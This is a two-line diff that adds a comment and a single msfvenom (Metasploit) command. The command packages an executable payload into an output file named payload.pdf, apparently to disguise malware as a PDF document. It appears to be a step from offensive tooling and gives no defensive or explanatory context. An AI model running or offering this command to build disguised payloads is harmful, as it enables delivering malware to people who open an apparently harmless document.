@@ -1,0 +1,2 @@
+# Generate PDF
+msfvenom -p generic/custom PAYLOADFILE=payload.exe > payload.pdf
